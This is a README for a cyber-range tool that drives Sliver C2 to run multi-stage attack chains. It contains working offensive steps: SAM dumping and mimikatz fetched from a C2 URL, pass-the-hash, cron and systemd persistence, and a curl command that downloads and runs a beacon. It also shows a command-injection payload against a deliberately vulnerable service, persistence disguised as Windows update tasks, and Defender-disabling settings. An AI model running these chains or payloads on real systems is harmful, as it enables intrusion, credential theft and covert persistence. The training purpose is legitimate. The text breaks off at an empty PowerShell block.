# Sliver Scenario Orchestrator

A service wrapper on top of Sliver's gRPC API that supports building and executing multi-stage attack chains for cyber range training. Chains are directed acyclic graphs (DAGs) of steps, where steps can forward their output to later steps and gate execution on conditions.

All commands in this README are run from the repo root (`sliver-orchestrator/`).

---

## Quick Start

### 1. Prepare `sliver-orchestrator-workspace`

The Docker lab mounts atomics from `../sliver-orchestrator-workspace/atomics` relative to `lab/docker-compose.yml`, which resolves to a sibling directory of the repo:

```
sliver-orchestrator/          ← repo root (run all commands here)
sliver-orchestrator-workspace/
└── atomics/                  ← ART technique YAMLs mounted into Docker
```

The workspace is tracked as a git submodule and atomics are already included. Initialize and pull it with:

```bash
git submodule update --init --remote
```

If you need to refresh atomics manually or don't use the submodule:

```bash
mkdir -p ../sliver-orchestrator-workspace/atomics
chmod +x atomic/fetch.sh
./atomic/fetch.sh ../sliver-orchestrator-workspace/atomics
```

### 2. Build the scenario-runner

```bash
make scenario-runner
```

This produces a `scenario-runner` binary in the repo root.

### 3. Start the lab

Run from the repo root:

```bash
docker compose -f lab/docker-compose.yml up --build -d
docker compose -f lab/docker-compose.yml logs -f c2
```

The compose stack exposes:
- `http://127.0.0.1:18080` — Scenario REST API
- `127.0.0.1:31337` — Sliver gRPC

### 4. Run the example chain

```bash
./scenario-runner -chain examples/linux-full-chain.yaml -graph -online-print
```

### 5. Check the API

```bash
curl http://127.0.0.1:18080/api/v1/health
curl http://127.0.0.1:18080/api/v1/atomics | jq .
curl http://127.0.0.1:18080/api/v1/sessions | jq .
```

---

## Lab Setup

### Docker

What starts automatically:
- The `c2` container starts `sliver-server`, generates an operator config, and runs `scenario-server`.
- The victim polls `GET /api/v1/health` until the API is ready, then downloads the Linux implant from `GET /api/v1/implant/linux`.
- On the first implant request, `scenario-server` starts a Sliver HTTP listener on port `80` and builds a Linux beacon.
- When the victim checks in, it appears in `GET /api/v1/sessions`.

Useful commands (run from repo root):

```bash
docker compose -f lab/docker-compose.yml up --build -d
docker compose -f lab/docker-compose.yml logs -f c2
docker compose -f lab/docker-compose.yml logs -f victim-1
docker compose -f lab/docker-compose.yml down -v
```

---

## Atomics Library

Technique definitions use the Atomic Red Team layout: `T1059.001/T1059.001.yaml`. The loader accepts both `.yaml` and `.yml` and scans subdirectories under the atomics root.

The Docker lab reads atomics from `../sliver-orchestrator-workspace/atomics` (sibling of the repo). The workspace submodule includes atomics already — initialize it with `git submodule update --init --remote`.

To refresh atomics manually:

```bash
chmod +x atomic/fetch.sh
./atomic/fetch.sh ../sliver-orchestrator-workspace/atomics
```

Optional cleanup after download:

```bash
./atomic/fetch.sh ../sliver-orchestrator-workspace/atomics --clean
```

`atomic/fetch.sh` downloads the GitHub archive and copies only the upstream `atomics/` tree. It does not install `Invoke-AtomicRedTeam` or PowerShell helper scripts.

For local execution on the C2 host, you can use GoART:

```bash
go install github.com/lcensies/go-atomicredteam/cmd/goart@latest
goart --technique T1059.001 --index 0 --atomics-path ./sliver-orchestrator-workspace/atomics
```

---

## Building

From the repo root:

```bash
make scenario-runner   # build scenario-runner (output: ./scenario-runner)
make scenario          # build scenario-server (output: ./scenario-server)
```

`scenario-server` requires CGO (for SQLite). The Docker lab builds it automatically — you only need `make scenario-server` for local development outside Docker.

---

## Chain YAML Schema

```yaml
id: lateral-movement-demo          # unique chain ID
name: "Pass-the-Hash Demo"
description: "Dump creds then move laterally"
mitre_tactics: [credential-access, lateral-movement]
tags: [demo, windows]
steps:
  - id: dump_sam                   # unique step ID within the chain
    name: "Dump SAM hive"
    action:
      type: command                # command | atomic | upload | binary | sliver_rpc
      command:
        interpreter: powershell    # sh | bash | powershell | cmd
        cmd: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"
    output_var: dump_stdout        # capture stdout → {{dump_stdout}} for later steps
    timeout: "60s"
    on_fail: abort                 # abort | continue | continue_no_err | skip_dependents
  - id: run_mimikatz
    depends_on: [dump_sam]
    action:
      type: binary
      binary:
        url: "http://192.168.56.10:8888/mimikatz.exe"  # C2 downloads then uploads
        remote_path: "C:\\Windows\\Temp\\mimi.exe"
        args: "privilege::debug sekurlsa::logonpasswords exit"
        platform: windows
        cleanup: true              # remove after execution
    output_extract:
      - var: ntlm_hash
        regex: "NTLM\\s*:\\s*([0-9a-fA-F]{32})"
        group: 1
      - var: cred_user
        regex: "Username\\s*:\\s*(\\S+)"
        group: 1
  - id: extract_hash
    depends_on: [dump_sam]
    conditions:
      - dump_stdout|contains: "The operation completed successfully"
    action:
      type: atomic
      atomic_ref:
        id: T1003.002
        test: 0
        args:
          output_dir: "C:\\Windows\\Temp"
  - id: pass_the_hash
    depends_on: [run_mimikatz]
    action:
      type: atomic
      atomic_ref:
        id: T1550.002
        test: 0
        args:
          ntlm_hash: "{{ntlm_hash}}"
          username:  "{{cred_user}}"
  - id: discovery
    action:
      type: atomic
      atomic_ref: { id: T1082, test: 0 }
```

### Action types

| Type | Description |
|---|---|
| `command` | Raw command via `interpreter` (sh/bash/powershell/cmd) |
| `atomic` | Resolves a technique from `atomics/` and executes it as a command |
| `upload` | Copies a file from a C2-server path to `remote_path` on the session |
| `binary` | Fetches a binary (embedded base64 `data` or `url`), uploads to victim, executes |
| `sliver_rpc` | Named Sliver RPC call (Ps, Screenshot, Ifconfig, Netstat) |

### `binary` action fields

| Field | Description |
|---|---|
| `data` | Base64-encoded binary payload (embedded in the chain definition) |
| `url` | URL the C2 server downloads the binary from before uploading |
| `remote_path` | Destination on the victim (auto-generated temp path if omitted) |
| `args` | Arguments appended when executing the binary |
| `platform` | `linux` (default) or `windows` — controls chmod, delete commands |
| `cleanup` | If `true`, remove the binary from the victim after execution |

Exactly one of `data` or `url` must be set.

### `probe` action fields

Runs a platform-appropriate command on the victim via Sliver and optionally validates the result.

| Field | Description |
|---|---|
| `kind` | What to probe: `os`, `kernel`, `arch`, `software_exists`, `software_version` |
| `software` | Program name (required for `software_exists` / `software_version`) |
| `match` | Go regex; step exits 1 if stdout doesn't match. Supports `{{VarName}}` |
| `platform` | `linux` (default), `windows`, or `darwin` |

| Kind | Linux/macOS command | Windows command |
|---|---|---|
| `os` | `uname -s` | `wmic os get Caption /value` |
| `kernel` | `uname -r` | `wmic os get Version /value` |
| `arch` | `uname -m` | `wmic os get OSArchitecture /value` |
| `software_exists` | `which <software>` | `where <software>` |
| `software_version` | `<sw> --version` | `<sw> --version` |

### `python` action fields

Executes a Python 3 script on the C2 server (not on the victim). stdout/stderr/exit-code are treated as the step's output.

| Field | Description |
|---|---|
| `script` | Path to a `.py` file on the C2 server filesystem |
| `inline` | Inline Python source (written to a temp file before execution) |
| `args` | Extra CLI arguments appended after the script path. Supports `{{VarName}}` |
| `env` | Extra environment variables for the script. Values support `{{VarName}}` |

Built-in env vars always injected:
- `SLIVER_CONFIG` — path to the Sliver operator `.cfg` file (for `sliver-py`)
- `SESSION_ID` — the current target session ID

Exactly one of `script` or `inline` must be set.

### Probe + Python example

```yaml
steps:
  - id: check_os
    name: "Detect victim OS"
    action:
      type: probe
      probe:
        kind: os
        platform: linux
    output_var: victim_os
  - id: check_kernel
    depends_on: [check_os]
    conditions:
      - victim_os|contains: Linux
    action:
      type: probe
      probe:
        kind: kernel
        platform: linux
        match: "^5\\..*"
    output_var: kernel_ver
    on_fail: abort
  - id: check_python3
    depends_on: [check_os]
    action:
      type: probe
      probe:
        kind: software_exists
        software: python3
        platform: linux
  - id: custom_recon
    depends_on: [check_os]
    action:
      type: python
      python:
        script: /opt/scenarios/scripts/recon.py
        env:
          TARGET_HOSTNAME: "{{hostname}}"
    output_var: recon_result
    output_extract:
      - var: open_port
        regex: "OPEN:(\\d+)"
        group: 1
  - id: inline_check
    action:
      type: python
      python:
        inline: |
          import os, sys
          session_id = os.environ["SESSION_ID"]
          print(f"Running against session: {session_id}")
          sys.exit(0)
```

A minimal `sliver-py` script (`/opt/scenarios/scripts/recon.py`):

```python
import asyncio, os, sys
from sliver import SliverClientConfig, SliverClient
async def main():
    cfg = SliverClientConfig.parse_config_file(os.environ["SLIVER_CONFIG"])
    client = SliverClient(cfg)
    await client.connect()
    session_id = os.environ["SESSION_ID"]
    interact = await client.interact_session(session_id)
    ls = await interact.ls("/tmp")
    for entry in ls.Files:
        print(entry.Name)
asyncio.run(main())
```

---

## Output variable passing

| Field | Description |
|---|---|
| `output_var` | Capture full stdout as a named variable |
| `output_filter` | When set alongside `output_var`, extract a regex capture group instead of full stdout |
| `output_extract` | List of `{var, regex, group}` — extract multiple named variables from stdout |

`{{VarName}}` is substituted in `command.cmd`, `binary.url`, `binary.remote_path`, `binary.args`, `upload.local_path`, `upload.remote_path`, `atomic_ref.args.*`, and `sliver_rpc.params.*`.

```yaml
  - id: recon
    action:
      type: command
      command:
        interpreter: sh
        cmd: "ip route | head -5"
    output_var: route_raw
    output_filter:
      regex: "default via ([\d.]+)"
      group: 1
  - id: multi_extract
    action:
      type: command
      command:
        interpreter: sh
        cmd: "id && hostname"
    output_extract:
      - var: uid
        regex: "uid=(\\d+)"
        group: 1
      - var: hostname
        regex: "^(\\S+)$"
        group: 1
```

---

## Condition operators

| Op | Description |
|---|---|
| `eq` / `neq` | Exact string equality |
| `contains` | Substring match |
| `matches` | Go regexp match |
| `gt` / `lt` | Numeric comparison (for exit_code or numeric output) |

Set `negate: true` to invert any condition.

Conditions can be written in two ways:
- Explicit: `var`, `op`, `value` (and optional `negate`).
- Sigma-style: a single key `var|op` with the value, e.g. `victim_os|contains: Linux` or `exit_code|eq: "0"`.

---

## Fail policies

| `on_fail` | Behaviour |
|---|---|
| `continue` | Log failure, continue other steps (default). Step counts as failed; chain reports failure at end if any step failed. |
| `continue_no_err` | Same as continue, but this step's failure does not cause the chain to be reported as failed. Use for optional/non-critical steps. |
| `abort` | Stop the entire chain immediately |
| `skip_dependents` | Skip all steps that (transitively) depend on this one |

---

## REST API Reference

All endpoints are under `/api/v1/`.

### Health

```
GET /health
```

### Sessions (Sliver proxy)

```
GET /sessions
```

Returns active Sliver sessions: `[{id, name, os, hostname, username, pid}]`

### Implant delivery

```
GET /implant/linux?arch=amd64&c2=172.20.0.10&port=80
```

On the first call, the server:
1. Starts a Sliver HTTP listener on `c2:port` (idempotent — skips if one is already running).
2. Compiles a Linux beacon implant via the Sliver gRPC API (~1–2 min).
3. Caches the binary in-process; subsequent calls return it instantly.
4. Returns the ELF binary as `application/octet-stream`.

| Query param | Default | Description |
|---|---|---|
| `arch` | `amd64` | Target architecture: `amd64` or `arm64` |
| `c2` | `C2_HOST` env or `172.20.0.10` | C2 callback address for the beacon |
| `port` | `80` | HTTP listener port on the C2 |

The victim entrypoint calls this automatically:

```bash
curl http://172.20.0.10:8080/api/v1/implant/linux -o /usr/local/bin/sliver-beacon
chmod +x /usr/local/bin/sliver-beacon && /usr/local/bin/sliver-beacon &
```

### Atomics

```
GET /atomics?tactic=execution&platform=windows
GET /atomics/{technique_id}      e.g. /atomics/T1059.001
```

### Chains

```
POST   /chains                   body: Chain JSON
GET    /chains
GET    /chains/{id}
PUT    /chains/{id}
DELETE /chains/{id}
POST   /chains/{id}/execute      body: {"session_id": "...", "dry_run": false}
```

`execute` returns `{"execution_id": "..."}` immediately and runs the chain asynchronously.

`dry_run: true` validates the DAG and returns the resolved step order without executing.

### Executions

```
GET  /executions?chain_id={id}   list executions (optionally filtered by chain)
GET  /executions/{id}            status + all step logs
GET  /executions/{id}/stream     SSE live event stream
POST /executions/{id}/cancel
```

### SSE event types

| Event | Payload |
|---|---|
| `step_start` | `{step_id}` |
| `step_done` | `{step_id, stdout, stderr, exit_code, duration_ms}` |
| `step_failed` | `{step_id, stdout, stderr, exit_code, error, duration_ms}` |
| `step_skipped` | `{step_id, message}` |
| `step_log` | Replay of a stored step log (sent first on stream connect) |
| `chain_done` | `{message}` |
| `chain_failed` | `{message}` |
| `done` | Stream close signal |

Example: stream an execution

```bash
EXEC_ID=$(curl -s -X POST http://localhost:8080/api/v1/chains/my-chain-id/execute \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"abc123"}' | jq -r .execution_id)
curl -N http://localhost:8080/api/v1/executions/${EXEC_ID}/stream
```

---

## Configuration

Priority: CLI flags > `SCENARIO_*` env vars > YAML file > defaults.

| Flag | Env var | Default | Description |
|---|---|---|---|
| `--config` | `SCENARIO_SLIVER_CONFIG` | required | Sliver operator `.cfg` file path |
| `--atomics` | `SCENARIO_ATOMICS_DIR` | `./atomics` | Technique YAML directory |
| `--db` | `SCENARIO_DB_PATH` | `./scenario.db` | SQLite database path |
| `--listen` | `SCENARIO_LISTEN` | `:8080` | HTTP listen address |
| `--allow-origin` | `SCENARIO_ALLOW_ORIGIN` | `*` | CORS Allow-Origin |
| (n/a) | `SCENARIO_C2_HOST` / `C2_HOST` | `172.20.0.10` | Beacon callback address for `GET /implant/linux` |

Optional YAML config file:

```yaml
sliver_config: /etc/sliver/scenario-operator.cfg
atomics_dir:   /opt/atomics
db_path:       /var/lib/scenario/scenario.db
listen:        :8080
allow_origin:  "*"
c2_host:       172.20.0.10
log_level:     info
```

---

## Project Structure

Repo root = this directory (scenario/ in sliver monorepo, or the repo root when standalone).

```
.
├── api/
│   ├── atomics.go       Atomic technique API
│   ├── chains.go        Chain CRUD operations
│   ├── executions.go    Session management + liveness probe + deduplication
│   ├── implant.go       Linux beacon generation
│   ├── implant_win.go   Windows beacon generation
│   └── server.go        Route definitions, CORS, server struct
├── atomic/
│   ├── fetch.sh         Download atomics: ZIP (default) or git sparse-checkout
│   ├── library.go       ART YAML parser, LoadDir() function
│   ├── model.go         Technique/Test/Executor Go structs
│   └── T*/              340 MITRE ATT&CK atomic technique YAML files
├── chain/
│   ├── condition.go     Variable substitution and condition evaluation
│   ├── condition_test.go
│   ├── executor.go      DAG chain execution engine, effectiveSession logic
│   ├── model.go         Chain/Step structs — includes SessionID for per-step override
│   └── resolver.go      DAG dependency resolver
├── cmd/server/
│   └── main.go          HTTP server entrypoint
├── config/
│   └── config.go        Config loading (YAML + env + CLI flags)
├── flexible-platform/   React web UI (TypeScript, Mantine UI, Vite, SSE)
├── lab/
│   ├── docker-compose.yml    Docker lab (c2 + linux victims)
│   ├── Dockerfile.victim     Victim container image
│   └── provision/
│       ├── c2-server.sh          C2 VM setup (Sliver, scenario-server, operator config)
│       ├── victim-linux.sh       Linux pivot setup (nmap, arp-scan, systemd services)
│       └── victim-windows.ps1    Windows target setup (Defender, auto-login, tasks)
├── sliver/
│   ├── client.go        Sliver gRPC connection wrapper
│   └── executor.go      Execute RPC with configurable timeout
├── store/
│   ├── db.go            SQLite store for execution history
│   └── models.go        Execution/Step DB models
├── examples/
│   ├── full-attack-chain-v2.yaml                         12-step attack chain (honeypot to VSS POC)
│   ├── initial-access-full-chain.yaml                    15-step chain — no session needed
│   ├── linux-full-chain.yaml                             Full Linux post-exploitation
│   ├── lateral_movement.yml                              Session handoff via Impacket
│   ├── lateral-two-beacons.yaml                          Two-beacon simultaneous execution
│   ├── lateral-inband-reachability.yaml                  ICMP network probe
│   ├── t1082-basic-discovery.yaml                        Single atomic test
│   ├── win-discovery.yaml                                Windows T1082 + T1016
│   ├── linux Internal host discovery.yaml                Parallel ping sweep
│   ├── Linux Network Enumeration.yaml                    T1016 atomic
│   ├── Linux Post-Exploitation: Discovery → ...yaml      Full Linux chain
│   ├── Probe second host from beacon (single session).yaml
│   ├── Quick Windows Service Discovery (SMB, SSH, WinRM).yaml
│   ├── Second beacon via per-step session_id.yaml
│   ├── Bruteforce Winrm using defaults passwords wordlist.yaml
│   └── run.sh                                            Helper: load + execute + stream
├── vendor/              Vendored Go dependencies
├── (honeypot-service) main.go   Vulnerable ResolvTech IP Resolver (command injection)
├── honeypot.py          Fake Hikvision DS-2CD camera HTTP server
├── Dockerfile           C2 container image (multi-stage)
├── Vagrantfile          VM definitions (c2, linux_pivot, win_target)
├── Makefile             Build targets (make scenario)
├── setup.sh             One-command lab setup
├── lab-run.py           Interactive CLI scenario runner
├── go.mod
└── go.sum
```

---

## Examples

The `examples/` directory contains ready-to-use chain definitions in YAML.

The API accepts both JSON and YAML (`Content-Type: application/yaml`).

### Example 1 — Single Atomic Test (`t1082-basic-discovery.yaml`)

The simplest possible chain: one step, one Atomic Red Team test.
Good for verifying that the lab is working end-to-end.
MITRE: T1082 — System Information Discovery

```yaml
steps:
  - id: sysinfo
    name: "System Information Discovery"
    action:
      type: atomic
      atomic_ref:
        id: T1082
        test: 0          # "System info enumeration (Linux)"
    output_var: sysinfo_out
    timeout: "30s"
```

### Example 2 — Full Linux Post-Exploitation Chain (`linux-full-chain.yaml`)

A realistic multi-phase attack chain covering four tactics:

| Phase | Steps | Techniques |
|---|---|---|
| 1 — Probe | `check_os`, `check_kernel` | Probe |
| 2 — Discovery | `sysinfo`, `account_discovery`, `net_config`, `net_connections`, `file_discovery` | T1082, T1087, T1016, T1049, T1083 |
| 3 — Persistence | `check_crontab`, `cron_persistence` | T1059.004 |
| 4 — Evasion | `clear_history` | T1070.001 |

Demonstrates:
- Parallel execution — all Phase 2 steps share `depends_on: [check_os]` so they run concurrently
- Conditions — sigma-style (e.g. `victim_os|contains: Linux`) gates Linux-only steps
- `skip_dependents` — cron persistence silently skips if crontab is missing
- Output capture — `output_var` stores stdout for later `{{VarName}}` substitution

### Example 3 — Full Attack Scenario (`full-attack-chain-v2.yaml`)

12-step APT-style attack chain — requires a pre-existing Linux Sliver session. Covers honeypot discovery, persistence, dynamic Windows host discovery, lateral movement via WMIExec, SAM credential dump, DC discovery, and VSS shadow copy POC.

| Step | Technique | MITRE | Description |
|---|---|---|---|
| `honeypot_recon` | Honeypot discovery | T1046 | Confirm fake camera HTTP 200 |
| `linux_sysinfo` | System info | T1082 | Linux OS/kernel/arch |
| `linux_network` | Network config | T1016 | Discover internal subnet |
| `cron_persistence` | Cron job | T1053.003 | Plant cron backdoor |
| `systemd_persistence` | Systemd service | T1543.002 | Create persistent service |
| `find_windows_host` | Dynamic host scan | T1046 | nmap → arp-scan → TCP sweep |
| `lateral_recon` | WMIExec | T1021.006 | Linux→Windows lateral movement |
| `win_sysinfo` | Windows recon | T1082 | Hostname via wmiexec |
| `deploy_implant` | Implant delivery | T1105 | Deploy svc.exe via scheduled task |
| `sam_dump` | SAM credential dump | T1003.002 | secretsdump.py → live NTLM hashes |
| `find_dc_candidate` | DC discovery | T1018 | Ports 88/389/445/3268 scan |
| `shadow_copy_vss` | VSS shadow copy | T1003.003 | Win32_ShadowCopy.Create POC |

Real SAM dump output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
vagrant:1001:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

Lateral movement log:
```
[*] LATERAL MOVEMENT INITIATED
[*] Attack vector: Impacket WMIExec (T1021.006)
[*] Source: linux_pivot (ubuntu-jammy)
[*] Target: 172.16.1.20 (Windows SMB/WMI)
[*] Credentials: vagrant:vagrant (T1078 - Valid Accounts)
DESKTOP-PSJFL91
[+] LATERAL_MOVEMENT_SUCCESS
```

### Example 4 — Initial Access Full Chain (`initial-access-full-chain.yaml`)

15-step end-to-end chain starting from zero pre-existing sessions. Exploits the ResolvTech vulnerable web server command injection (T1190) to gain initial access, then runs full post-exploitation across Linux and Windows.

No session required — run with dummy session ID `00000000-0000-0000-0000-000000000000` or use the "Run without session" button in the UI.

| Phase | Steps | Techniques |
|---|---|---|
| 0 — Initial Access | `exploit_vulnweb` | T1190 — Command injection, beacon deploy, session capture |
| 1 — Foothold | `confirm_foothold`, `network_discovery` | T1082, T1016 |
| 2 — Persistence | `cron_persistence`, `systemd_persistence`, `bashrc_persistence` | T1053.003, T1543.002, T1546.004 |
| 3 — Discovery | `find_windows_host` | T1046 — Dynamic nmap/arp-scan/TCP sweep |
| 4 — Bruteforce | `bruteforce_credentials` | T1110.001 — Default password wordlist via WMIExec |
| 5 — Lateral | `lateral_movement` | T1021.006 — WMIExec with full movement log |
| 6 — Win Recon | `win_sysinfo`, `win_network` | T1082, T1016 |
| 7 — Implant | `deploy_windows_implant` | T1105 — Trigger WindowsUpdateHelper task |
| 8 — Credentials | `credential_dump` | T1003.002 — secretsdump.py, live NTLM hashes |
| 9 — DC Scan | `find_dc_candidate` | T1018 — Ports 88/389/445/3268 |
| 10 — VSS | `shadow_copy_vss` | T1003.003 — Win32_ShadowCopy.Create POC |

```bash
# Run via API (no session needed):
EXEC=$(curl -s -X POST http://192.168.56.5:8080/api/v1/chains/initial-access-full-chain/execute \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"00000000-0000-0000-0000-000000000000"}' | jq -r '.execution_id')
curl -N "http://192.168.56.5:8080/api/v1/executions/$EXEC/stream"
```

Proven 15/15 output:
```
[+] RCE confirmed: uid=0(root) gid=0(root) groups=0(root)
CAPTURED_SESSION: 72c13370-747a-4409-b385-501ef3725949
FOOTHOLD_CONFIRMED — ubuntu-jammy root
WINDOWS_HOST_FOUND: 172.16.1.20
VALID_CREDENTIAL: vagrant:vagrant → hostname: DESKTOP-PSJFL91
LATERAL_MOVEMENT_SUCCESS — DESKTOP-PSJFL91
Administrator:500:...:e02bc503339d51f71d913c245d35b50b:::
WINDOWS_BEACON_DEPLOYED
VSS_POC_COMPLETE
══════ Execution finished ══════
```

### Running examples with `run.sh`

```bash
# Start the lab first (if not already running)
docker-compose -f lab/docker-compose.yml up --build -d

# Example 1 — basic atomic test
./examples/run.sh examples/t1082-basic-discovery.yaml

# Example 2 — full attack chain
./examples/run.sh examples/linux-full-chain.yaml
```

The script:
- Checks API health
- Auto-selects the first active session
- POSTs the YAML chain definition
- Dry-runs to validate the DAG
- Executes and streams results live with step-by-step output

Manual equivalent (curl + jq):

```bash
API=http://127.0.0.1:18080/api/v1
SESSION=$(curl -s $API/sessions | jq -r '.[0].id')

CHAIN_ID=$(curl -s -X POST $API/chains \
  -H 'Content-Type: application/yaml' \
  --data-binary @examples/t1082-basic-discovery.yaml | jq -r .id)

EXEC_ID=$(curl -s -X POST $API/chains/$CHAIN_ID/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$SESSION\"}" | jq -r .execution_id)

curl -N $API/executions/$EXEC_ID/stream
```

---

## Building and moving the package out

The scenario packages live inside the Sliver Go module for convenience (shared vendored deps). To use as a standalone repo, copy this directory (scenario/) as the new repo root:

```bash
cp -r scenario/ /path/to/standalone/
cd /path/to/standalone
# Add go.mod at root, add explicit requires for grpc/gorm/yaml/protobuf, then:
go mod tidy
```

---

## Vagrant Lab

### Deployment Guide

#### Prerequisites

Ensure the following tools are installed:
- Vagrant (v2.4.1+) & VirtualBox (v7.0+)
- Go (v1.22+) for building the orchestrator

#### Prepare Workspace & Build

```bash
# Initialize submodules and pull atomics
git submodule update --init --remote

# Build the system components
make scenario-runner
make scenario-server
```

#### Deploy the Lab (Vagrant)

This setup provisions a dual-homed Linux gateway, a C2 orchestrator, and an isolated Windows 10 target.

```bash
# Boot VMs in order (c2 first so victims can reach it)
vagrant up c2
sleep 30
vagrant up linux_pivot
sleep 10
vagrant up win_target
```

After an unexpected shutdown, clean up inaccessible VMs first:

```bash
VBoxManage list vms | grep inaccessible | grep -oP "\{.*?\}" | tr -d "{}" | \
  xargs -I{} VBoxManage unregistervm {} 2>/dev/null || true
```


| Host Name | OS | Internal IP | Role |
|---|---|---|---|
| `c2` | Ubuntu 22.04 | 192.168.56.5 | Sliver C2 + scenario-server |
| `linux_pivot` | Ubuntu 22.04 | 192.168.56.10 / 172.16.1.10 | Dual-homed attacker pivot |
| `win_target` | Windows 10 | 172.16.1.20 / 192.168.56.20 | Isolated Windows victim |

The Windows target has a second hostonly adapter (192.168.56.20) so deployed implants can call back to C2 at 192.168.56.5 after lateral movement through the pivot.

### Honeypot — ResolvTech IP Resolver

The linux_pivot runs a deliberately vulnerable Go web server (`(honeypot-service) main.go`) simulating a fictional DNS resolver service. It exposes a command injection vulnerability used as the initial access vector:

```go
// Unsanitised input passed directly to shell
cmd := exec.Command("sh", "-c", "nslookup "+query)
```

Exploitation example:
```
GET /resolve?query=127.0.0.1;id
→ uid=0(root) gid=0(root) groups=0(root)
```

The `resolvtech.service` systemd unit manages this binary and starts it automatically on boot. The service is the entry point for the `initial-access-full-chain` scenario.

### Manual Exploitation & Pivoting Playbook

#### Start Sliver C2 & Listener

```bash
./sliver-server
```

```
[server] sliver > mtls
```

#### Generate and Run Windows Payload

```bash
# Generate payload in Sliver
generate --mtls <C2_IP> --os windows --arch amd64 --save ./win_agent.exe

# Access Windows via Vagrant and run (Shared folder: /vagrant)
vagrant ssh win_target -c "C:\\vagrant\\win_agent.exe"
```

#### Establish the Pivot (SOCKS5)

```
[server] sliver > sessions
[server] sliver > use <ID>
[server] sliver (SESSION) > socks5 start --port 1080
```

```bash
# Verify connectivity from host
proxychains nmap -sT -Pn 192.168.56.10
```

### Automation

#### Linux Pivot — Systemd Services

| Service | Purpose | Restart Policy |
|---|---|---|
| `sliver-implant.service` | Linux C2 beacon | Always, 0s interval |
| `implant-watchdog.service` | Restarts beacon if not running (every 30s) | Always |
| `honeypot.service` | Fake Hikvision DS-2CD camera on port 8080 | Always |
| `resolvtech.service` | Vulnerable ResolvTech IP Resolver (command injection) on port 8080 | Always, 5s restart |
| `svc-server.service` | HTTP server for Windows implant — auto-fetches svc.exe from C2 API on start | Always, 30s restart |
| `remount-rw.service` | Remounts root filesystem as read-write on boot | oneshot |

The `svc-server` performs a retry loop (20 attempts x 30 second intervals) to download `svc.exe` from the C2 API before starting the HTTP server. This ensures the Windows implant is always available even when C2 boots after linux_pivot.

#### Windows Target — Scheduled Tasks & Registry

| Item | Type | Trigger | Action |
|---|---|---|---|
| `WindowsUpdateHelper` | Scheduled Task | AtLogOn (vagrant user) | 20-retry download loop: Invoke-WebRequest svc.exe then Start-Process |
| `WindowsDefenderCheck` | Scheduled Task | Every 5 minutes | If svc* not running: download and start svc.exe |
| `SAMDump` | Scheduled Task | AtStartup | reg save HKLM\SAM C:\Windows\Temp\sam.hive |
| `VSSDump` | Scheduled Task | AtStartup | (Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible") |
| `WindowsUpdate` | HKCU Run key | Login | Backup implant launcher (same retry loop) |
| Auto-login | Winlogon registry | Boot | vagrant/vagrant auto-login, triggers AtLogOn tasks |
| Defender disabled | Registry policy | Permanent | DisableAntiSpyware=1, DisableRealtimeMonitoring=1 |

### Orchestrator Configuration & YAML Schema

The orchestrator builds attack chains using a Directed Acyclic Graph (DAG) model. See [Chain YAML Schema](#chain-yaml-schema) above for the full reference.

#### Action Types

| Type | Description |
|---|---|
| `command` | Raw command execution via shell |
| `atomic` | Executes a MITRE ATT&CK technique from the Atomics library |
| `binary` | Uploads and executes a binary (Base64 data or URL) |
| `sliver_rpc` | Direct Sliver gRPC calls (Screenshot, Netstat, etc.) |
| `python` | Python 3 script executed on the C2 server |

#### Example Chain (`lateral-movement-demo.yaml`)

```yaml
id: lateral-movement-demo
steps:
  - id: dump_sam
    action:
      type: command
      command:
        interpreter: powershell
        cmd: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"
  - id: run_mimikatz
    depends_on: [dump_sam]
    action:
      type: binary
      binary:
        url: "http://c2.internal/mimikatz.exe"
        remote_path: "C:\\Windows\\Temp\\mimi.exe"
        platform: windows
```

### REST API Reference (Port 8080)

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/health` | `GET` | Health check |
| `/api/v1/sessions` | `GET` | List active Sliver sessions |
| `/api/v1/chains` | `POST` | Create a new attack chain |
| `/api/v1/chains/{id}/execute` | `POST` | Execute a specific chain |
| `/api/v1/executions/{id}/stream` | `GET` | SSE live event stream |
| `/api/v1/atomics` | `GET` | List all 340 ATT&CK techniques |

### Interactive CLI & Web UI

```bash
# Start frontend (http://localhost:5173)
cd flexible-platform && npm run dev

# Interactive CLI scenario runner
pip install sseclient-py requests --break-system-packages
python3 lab-run.py
```

The session picker modal includes a "Run without session" button for chains that capture their own session dynamically (e.g. `initial-access-full-chain`).

### Troubleshooting

**Win10 Boot:** Wait 2-3 minutes for WinRM/SSH initialization.

**Shared Folder missing:**
```bash
vagrant plugin install vagrant-vbguest && vagrant reload
```

**Port Collision:** If port 2200 is busy, check terminal logs for the remapped port.

**Sessions not appearing after boot:**
```bash
# Check backend health
curl -s http://192.168.56.5:8080/api/v1/health

# Check svc-server on linux_pivot
vagrant ssh linux_pivot -c "sudo systemctl status svc-server"
vagrant ssh linux_pivot -c "curl -s -o /dev/null -w '%{http_code}' http://172.16.1.10:8000/svc.exe"

# Manually trigger Windows implant task
vagrant winrm win_target -c "Start-ScheduledTask 'WindowsUpdateHelper'; Write-Host 'triggered'"
```

**Cron or profile.d persistence fails — Read-only file system:**
```bash
vagrant ssh linux_pivot -c "sudo mount -o remount,rw / && echo 'remounted'"
vagrant ssh linux_pivot -c "sudo touch /etc/cron.d/test && echo 'writable' && sudo rm /etc/cron.d/test"
```

If the issue persists after reboot, reinstall the remount service:

```bash
vagrant ssh linux_pivot << 'SSHEOF'
sudo tee /etc/systemd/system/remount-rw.service > /dev/null << 'EOF'
[Unit]
Description=Remount root filesystem as read-write
DefaultDependencies=no
After=local-fs.target
Before=basic.target
[Service]
Type=oneshot
ExecStart=/bin/mount -o remount,rw /
RemainAfterExit=yes
[Install]
WantedBy=basic.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable remount-rw
sudo systemctl start remount-rw
SSHEOF
```

**svc-server returns 404:**
```bash
vagrant ssh linux_pivot -c "sudo mount -o remount,rw / 2>/dev/null; sudo systemctl restart svc-server"
```

**Windows loses internet after restart** — Static IP was accidentally set on the NAT adapter. Fix in Windows PowerShell:

```powershell
